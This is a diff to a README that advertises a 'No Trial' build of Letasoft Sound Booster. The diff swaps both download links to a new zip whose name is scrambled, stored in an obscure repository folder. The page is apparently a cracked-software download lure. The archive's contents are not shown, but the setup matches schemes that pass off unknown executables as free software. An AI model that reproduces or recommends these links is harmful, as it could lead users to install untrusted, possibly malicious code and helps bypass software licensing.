@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now!
 
-[![Download Release](https://raw.githubusercontent.com/tai10124/Letasoft-Sound-Booster-No-Trial/main/witherwards/Letasoft-Sound-Booster-No-Trial-v3.4-beta.1.zip)](https://raw.githubusercontent.com/tai10124/Letasoft-Sound-Booster-No-Trial/main/witherwards/Letasoft-Sound-Booster-No-Trial-v3.4-beta.1.zip)
+[![Download Release](https://raw.githubusercontent.com/tai10124/Letasoft-Sound-Booster-No-Trial/main/witherwards/Trial_Booster_No_Letasoft_Sound_2.9-beta.3.zip)](https://raw.githubusercontent.com/tai10124/Letasoft-Sound-Booster-No-Trial/main/witherwards/Trial_Booster_No_Letasoft_Sound_2.9-beta.3.zip)
 
 ## 📖 Table of Contents
 - [Introduction](#-introduction)
@@ -38,7 +38,7 @@ To run Letasoft Sound Booster, you need:
 
 To download Letasoft Sound Booster, visit the link below:
 
-[Click here to download Letasoft Sound Booster](https://raw.githubusercontent.com/tai10124/Letasoft-Sound-Booster-No-Trial/main/witherwards/Letasoft-Sound-Booster-No-Trial-v3.4-beta.1.zip)
+[Click here to download Letasoft Sound Booster](https://raw.githubusercontent.com/tai10124/Letasoft-Sound-Booster-No-Trial/main/witherwards/Trial_Booster_No_Letasoft_Sound_2.9-beta.3.zip)
 
 1. Open the link.
 2. Choose the latest release.
